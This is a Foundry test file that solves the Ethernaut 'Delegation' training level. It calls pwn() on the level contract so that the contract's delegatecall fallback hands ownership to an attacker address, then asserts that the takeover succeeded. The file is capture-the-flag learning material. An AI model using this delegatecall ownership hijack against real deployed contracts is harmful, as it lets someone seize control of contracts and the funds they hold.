// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/06-Delegation/DelegationFactory.sol";
import "src/core/Ethernaut.sol";
import "src/levels/06-Delegation/DelegationAttack.sol";

contract DelegationTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Delegation level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testDelegationExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        DelegationFactory delegationFactory = new DelegationFactory();

        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation delegationContract = Delegation(payable(levelAddress));

        emit log_named_address(
            "The original owner of the contract",
            delegationContract.owner()
        );
        emit log_named_address(
            "Address of the exploit contract",
            address(this)
        );
        emit log_named_address("Attacker's address", address(attacker));

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        // DelegationAttack delegationAttack = new DelegationAttack(levelAddress);

        emit log_named_address(
            "Owner of contract (before attack)",
            delegationContract.owner()
        );

        emit log_string("Starting the exploit...");
        (bool success, ) = address(delegationContract).call(
            abi.encodeWithSignature("pwn()")
        );

        emit log_named_address(
            "Owner of contract (after attack)",
            delegationContract.owner()
        );

        // delegationAttack.attack();

        // Test assertion
        assertEq(success, true);
        assertEq(delegationContract.owner(), attacker);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
